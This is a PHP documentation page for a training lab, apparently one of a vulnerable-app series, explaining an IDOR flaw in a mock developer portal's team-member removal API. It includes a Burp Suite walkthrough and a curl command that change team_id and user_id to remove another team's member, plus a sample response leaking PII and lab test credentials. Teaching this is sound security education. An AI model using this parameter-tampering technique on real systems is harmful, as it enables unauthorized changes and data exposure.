<?php
/**
 * Lab 28: Documentation Part 1 - Overview & Walkthrough
 * MTN Developers Portal IDOR
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation - Lab 28</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a0a 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .header {
            background: linear-gradient(135deg, #ffcc00, #ff9900);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            text-decoration: none;
        }
        .logo-icon {
            width: 45px;
            height: 45px;
            background: #000;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1rem;
            color: #ffcc00;
        }
        .logo-text {
            font-size: 1.4rem;
            font-weight: bold;
            color: #000;
        }
        .nav-links a {
            color: #000;
            text-decoration: none;
            margin-left: 1.5rem;
            font-weight: 500;
        }
        .main-content {
            max-width: 1000px;
            margin: 0 auto;
            padding: 2rem;
        }
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
            gap: 0.5rem;
        }
        .nav-btn {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            background: rgba(255, 204, 0, 0.1);
            border: 1px solid rgba(255, 204, 0, 0.3);
            border-radius: 8px;
            color: #ffcc00;
            text-decoration: none;
            transition: all 0.3s;
        }
        .nav-btn:hover {
            background: rgba(255, 204, 0, 0.2);
        }
        .nav-btn.active {
            background: #ffcc00;
            color: #000;
        }
        .doc-tabs {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 2rem;
            border-bottom: 2px solid rgba(255, 204, 0, 0.2);
            padding-bottom: 0.5rem;
        }
        .doc-tab {
            padding: 0.75rem 1.5rem;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 204, 0, 0.2);
            border-bottom: none;
            border-radius: 8px 8px 0 0;
            color: #888;
            text-decoration: none;
            transition: all 0.3s;
        }
        .doc-tab:hover {
            color: #ffcc00;
            background: rgba(255, 204, 0, 0.1);
        }
        .doc-tab.active {
            background: rgba(255, 204, 0, 0.15);
            color: #ffcc00;
            border-color: #ffcc00;
        }
        .card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 204, 0, 0.2);
            border-radius: 12px;
            padding: 2rem;
            margin-bottom: 1.5rem;
        }
        .card h1, .card h2, .card h3 {
            color: #ffcc00;
            margin-bottom: 1rem;
        }
        .card h1 { font-size: 1.75rem; }
        .card h2 { font-size: 1.4rem; margin-top: 1.5rem; }
        .card h3 { font-size: 1.15rem; margin-top: 1.25rem; color: #ff9900; }
        .card p {
            color: #aaa;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .card ul, .card ol {
            padding-left: 1.5rem;
            color: #aaa;
            line-height: 1.8;
        }
        .card li { margin-bottom: 0.5rem; }
        code {
            background: rgba(0, 0, 0, 0.4);
            padding: 0.15rem 0.4rem;
            border-radius: 4px;
            color: #00ff88;
            font-family: 'Consolas', monospace;
        }
        code.block {
            display: block;
            background: #0d1117;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            overflow-x: auto;
            white-space: pre;
            color: #c9d1d9;
            border: 1px solid #30363d;
            font-size: 0.9rem;
        }
        .highlight-box {
            background: rgba(255, 204, 0, 0.1);
            border-left: 4px solid #ffcc00;
            padding: 1rem 1.25rem;
            margin: 1rem 0;
            border-radius: 0 8px 8px 0;
        }
        .danger-box {
            background: rgba(255, 68, 68, 0.1);
            border-left: 4px solid #ff4444;
            padding: 1rem 1.25rem;
            margin: 1rem 0;
            border-radius: 0 8px 8px 0;
        }
        .info-box {
            background: rgba(68, 136, 255, 0.1);
            border-left: 4px solid #4488ff;
            padding: 1rem 1.25rem;
            margin: 1rem 0;
            border-radius: 0 8px 8px 0;
        }
        .success-box {
            background: rgba(68, 255, 68, 0.1);
            border-left: 4px solid #44ff44;
            padding: 1rem 1.25rem;
            margin: 1rem 0;
            border-radius: 0 8px 8px 0;
        }
        .highlight-box h3, .danger-box h3, .info-box h3, .success-box h3 {
            margin-bottom: 0.5rem;
            font-size: 0.95rem;
        }
        .danger-box h3 { color: #ff4444; }
        .highlight-box h3 { color: #ffcc00; }
        .info-box h3 { color: #4488ff; }
        .success-box h3 { color: #44ff44; }
        .toc {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 204, 0, 0.2);
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }
        .toc h3 {
            color: #ffcc00;
            margin-bottom: 1rem;
            font-size: 1rem;
        }
        .toc ul {
            list-style: none;
            padding: 0;
        }
        .toc li {
            margin-bottom: 0.5rem;
        }
        .toc a {
            color: #888;
            text-decoration: none;
            transition: color 0.3s;
        }
        .toc a:hover {
            color: #ffcc00;
        }
        .step-card {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 204, 0, 0.15);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
        }
        .step-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        .step-number {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #ffcc00, #ff9900);
            color: #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1.1rem;
        }
        .step-title {
            color: #fff;
            font-size: 1.15rem;
        }
        .btn {
            display: inline-block;
            padding: 0.75rem 1.5rem;
            background: linear-gradient(135deg, #ffcc00, #ff9900);
            color: #000;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            margin: 0.5rem 0.5rem 0.5rem 0;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 204, 0, 0.4);
        }
        .btn-secondary {
            background: transparent;
            border: 2px solid #ffcc00;
            color: #ffcc00;
        }
        .table-container {
            overflow-x: auto;
            margin: 1rem 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            overflow: hidden;
        }
        th, td {
            padding: 0.75rem 1rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 204, 0, 0.1);
        }
        th {
            background: rgba(255, 204, 0, 0.15);
            color: #ffcc00;
            font-weight: 600;
        }
        td { color: #aaa; }
        td code {
            font-size: 0.85rem;
        }
    </style>
</head>
<body>
    <header class="header">
        <a href="index.php" class="logo">
            <div class="logo-icon">MTN</div>
            <div class="logo-text">Developers Portal</div>
        </a>
        <nav class="nav-links">
            <a href="index.php">← Back to Lab</a>
            <a href="login.php">Login</a>
            <a href="success.php">Submit Flag</a>
        </nav>
    </header>

    <main class="main-content">
        <div class="nav-buttons">
            <a href="index.php" class="nav-btn">← Back to Lab Home</a>
            <a href="lab-description.php" class="nav-btn">Lab Description</a>
        </div>

        <div class="doc-tabs">
            <a href="docs.php" class="doc-tab active">Part 1: Overview</a>
            <a href="docs-technical.php" class="doc-tab">Part 2: Technical Analysis</a>
            <a href="docs-mitigation.php" class="doc-tab">Part 3: Mitigation</a>
        </div>

        <div class="card">
            <h1>📚 Documentation: IDOR in Team Member Removal</h1>
            <p>
                This comprehensive documentation explains the Insecure Direct Object Reference (IDOR) 
                vulnerability found in the MTN Developers Portal's team member removal functionality.
            </p>
        </div>

        <div class="toc">
            <h3>📑 Table of Contents - Part 1</h3>
            <ul>
                <li><a href="#overview">1. Vulnerability Overview</a></li>
                <li><a href="#idor-explained">2. What is IDOR?</a></li>
                <li><a href="#attack-scenario">3. Attack Scenario</a></li>
                <li><a href="#walkthrough">4. Step-by-Step Walkthrough</a></li>
                <li><a href="#test-accounts">5. Test Accounts</a></li>
                <li><a href="#tools">6. Tools Required</a></li>
            </ul>
        </div>

        <div class="card" id="overview">
            <h2>1. Vulnerability Overview</h2>
            <p>
                The MTN Developers Portal allows team owners and administrators to remove members 
                from their teams. This functionality is implemented through a REST API endpoint 
                that accepts the team ID and user ID to be removed.
            </p>
            <p>
                The vulnerability exists because the server only verifies that the requester is 
                authenticated, but <strong>does not verify that they have permission to manage 
                the specified team</strong>.
            </p>

            <div class="danger-box">
                <h3>🔥 Root Cause</h3>
                <p>
                    The API endpoint trusts the client-supplied <code>team_id</code> parameter without 
                    validating that the authenticated user has owner or admin privileges on that team.
                </p>
            </div>

            <div class="table-container">
                <table>
                    <tr>
                        <th>Attribute</th>
                        <th>Value</th>
                    </tr>
                    <tr>
                        <td>Vulnerability Type</td>
                        <td>IDOR (Insecure Direct Object Reference)</td>
                    </tr>
                    <tr>
                        <td>Secondary Issue</td>
                        <td>Information Disclosure</td>
                    </tr>
                    <tr>
                        <td>CVSS Score</td>
                        <td><code style="color: #ff4444;">7.1 (High)</code></td>
                    </tr>
                    <tr>
                        <td>Affected Endpoint</td>
                        <td><code>/api/remove_member.php</code></td>
                    </tr>
                    <tr>
                        <td>HTTP Method</td>
                        <td>POST</td>
                    </tr>
                    <tr>
                        <td>Authentication Required</td>
                        <td>Yes (any authenticated user)</td>
                    </tr>
                </table>
            </div>
        </div>

        <div class="card" id="idor-explained">
            <h2>2. What is IDOR?</h2>
            <p>
                <strong>Insecure Direct Object Reference (IDOR)</strong> is a type of access control 
                vulnerability that occurs when an application uses user-supplied input to access 
                objects directly without proper authorization checks.
            </p>

            <h3>Common IDOR Patterns</h3>
            <ul>
                <li><strong>Horizontal Privilege Escalation:</strong> Accessing another user's data at the same privilege level</li>
                <li><strong>Vertical Privilege Escalation:</strong> Accessing data above your privilege level</li>
                <li><strong>BOLA (Broken Object Level Authorization):</strong> API-specific term for IDOR</li>
            </ul>

            <div class="info-box">
                <h3>💡 This Lab Demonstrates</h3>
                <p>
                    This vulnerability is a combination of <strong>horizontal IDOR</strong> (accessing 
                    another team's management functions) and <strong>information disclosure</strong> 
                    (leaking user PII in the response).
                </p>
            </div>

            <h3>Why IDOR is Dangerous</h3>
            <p>IDOR vulnerabilities are particularly dangerous because:</p>
            <ol>
                <li>They are easy to exploit - just change a parameter value</li>
                <li>They can affect all users of the application</li>
                <li>They often go unnoticed in automated security scans</li>
                <li>Impact can range from data theft to complete account takeover</li>
            </ol>
        </div>

        <div class="card" id="attack-scenario">
            <h2>3. Attack Scenario</h2>
            <p>
                In this lab, we simulate a real-world attack where a malicious user exploits the 
                IDOR vulnerability to remove members from teams they don't own or manage.
            </p>

            <div class="highlight-box">
                <h3>📋 Scenario Setup</h3>
                <ul>
                    <li><strong>Attacker (Account A):</strong> user_id = 1111, owns Team A (id: 0001)</li>
                    <li><strong>Victim Owner (Account B):</strong> user_id = 1112, owns Team B (id: 0002)</li>
                    <li><strong>Target Member (Account C):</strong> user_id = 1113, member of Team B</li>
                </ul>
            </div>

            <h3>Attack Goal</h3>
            <p>
                The attacker (Account A) wants to remove Carol (Account C) from Bob's Team (Team B), 
                even though the attacker has no relationship with Team B.
            </p>

            <h3>Expected vs Actual Behavior</h3>
            <div class="table-container">
                <table>
                    <tr>
                        <th>Aspect</th>
                        <th>Expected (Secure)</th>
                        <th>Actual (Vulnerable)</th>
                    </tr>
                    <tr>
                        <td>Authorization Check</td>
                        <td>Verify requester is team owner/admin</td>
                        <td>Only checks if user is logged in</td>
                    </tr>
                    <tr>
                        <td>Error on Unauthorized</td>
                        <td>403 Forbidden</td>
                        <td>200 OK (success)</td>
                    </tr>
                    <tr>
                        <td>Response Data</td>
                        <td>Minimal, no PII</td>
                        <td>Full user and team details</td>
                    </tr>
                </table>
            </div>
        </div>

        <div class="card" id="walkthrough">
            <h2>4. Step-by-Step Walkthrough</h2>
            
            <div class="step-card">
                <div class="step-header">
                    <span class="step-number">1</span>
                    <span class="step-title">Login as the Attacker</span>
                </div>
                <p>Navigate to the login page and authenticate with the attacker credentials:</p>
                <ul>
                    <li>Username: <code>attacker</code></li>
                    <li>Password: <code>attacker123</code></li>
                </ul>
            </div>

            <div class="step-card">
                <div class="step-header">
                    <span class="step-number">2</span>
                    <span class="step-title">Navigate to Your Team</span>
                </div>
                <p>Go to the Dashboard and click on "Team A - Attacker's Team" to access the team management page.</p>
            </div>

            <div class="step-card">
                <div class="step-header">
                    <span class="step-number">3</span>
                    <span class="step-title">Configure Burp Suite</span>
                </div>
                <p>Ensure Burp Suite is running and your browser is configured to proxy traffic through it:</p>
                <ul>
                    <li>Proxy: <code>127.0.0.1:8080</code></li>
                    <li>Enable "Intercept is on" in Burp</li>
                </ul>
            </div>

            <div class="step-card">
                <div class="step-header">
                    <span class="step-number">4</span>
                    <span class="step-title">Trigger the Remove Action</span>
                </div>
                <p>Click the "Remove" button for any member in your team. Burp Suite will intercept the request.</p>
                <code class="block">POST /Lab-28/api/remove_member.php HTTP/1.1
Host: localhost
Content-Type: application/json
Cookie: PHPSESSID=abc123...

{
    "team_id": "0001",
    "user_id": "1234"
}</code>
            </div>

            <div class="step-card">
                <div class="step-header">
                    <span class="step-number">5</span>
                    <span class="step-title">Modify the Request (IDOR)</span>
                </div>
                <p>Change the parameters to target Bob's team and Carol:</p>
                <code class="block">{
    "team_id": "0002",    // Changed to Bob's team
    "user_id": "1113"     // Changed to Carol's ID
}</code>
            </div>

            <div class="step-card">
                <div class="step-header">
                    <span class="step-number">6</span>
                    <span class="step-title">Forward the Request</span>
                </div>
                <p>Click "Forward" in Burp Suite to send the modified request.</p>
            </div>

            <div class="step-card">
                <div class="step-header">
                    <span class="step-number">7</span>
                    <span class="step-title">Observe the Response</span>
                </div>
                <p>The server responds with a success message AND leaks sensitive information:</p>
                <code class="block">{
    "success": true,
    "message": "Member removed successfully",
    "removed_user": {
        "user_id": "1113",
        "username": "carol_admin",
        "full_name": "Carol Administrator",
        "email": "carol@mtn.com"
    },
    "from_team": {
        "team_id": "0002",
        "name": "Team B - API Integration",
        "description": "Bob's team for API integrations"
    }
}</code>
            </div>

            <div class="success-box">
                <h3>✅ Attack Successful!</h3>
                <p>
                    Carol has been removed from Bob's team, and you've obtained sensitive PII 
                    through information disclosure. Navigate to the <a href="success.php" style="color: #44ff44;">Success Page</a> 
                    to claim your flag!
                </p>
            </div>
        </div>

        <div class="card" id="test-accounts">
            <h2>5. Test Accounts</h2>
            <div class="table-container">
                <table>
                    <tr>
                        <th>Role</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>User ID</th>
                        <th>Team</th>
                    </tr>
                    <tr>
                        <td style="color: #ff6b6b;">Attacker</td>
                        <td><code>attacker</code></td>
                        <td><code>attacker123</code></td>
                        <td><code>1111</code></td>
                        <td>Team A (Owner)</td>
                    </tr>
                    <tr>
                        <td style="color: #4dabf7;">Victim Owner</td>
                        <td><code>bob_dev</code></td>
                        <td><code>bob123</code></td>
                        <td><code>1112</code></td>
                        <td>Team B (Owner)</td>
                    </tr>
                    <tr>
                        <td style="color: #4dabf7;">Target Member</td>
                        <td><code>carol_admin</code></td>
                        <td><code>carol123</code></td>
                        <td><code>1113</code></td>
                        <td>Team B (Admin)</td>
                    </tr>
                </table>
            </div>
        </div>

        <div class="card" id="tools">
            <h2>6. Tools Required</h2>
            <ul>
                <li><strong>Web Browser:</strong> Chrome, Firefox, or any modern browser</li>
                <li><strong>Burp Suite:</strong> Community or Professional edition for intercepting requests</li>
                <li><strong>Alternative:</strong> Browser DevTools Network tab + cURL for manual testing</li>
            </ul>

            <div class="info-box">
                <h3>💡 Using cURL Instead</h3>
                <p>If you prefer not to use Burp Suite, you can use cURL:</p>
            </div>
            <code class="block">curl -X POST "http://localhost/Lab-28/api/remove_member.php" \
     -H "Content-Type: application/json" \
     -H "Cookie: PHPSESSID=YOUR_SESSION_ID" \
     -d '{"team_id": "0002", "user_id": "1113"}'</code>
        </div>

        <div class="nav-buttons" style="margin-top: 2rem;">
            <a href="index.php" class="nav-btn">← Back to Lab Home</a>
            <a href="docs-technical.php" class="nav-btn">Part 2: Technical Analysis →</a>
        </div>
    </main>
</body>
</html>
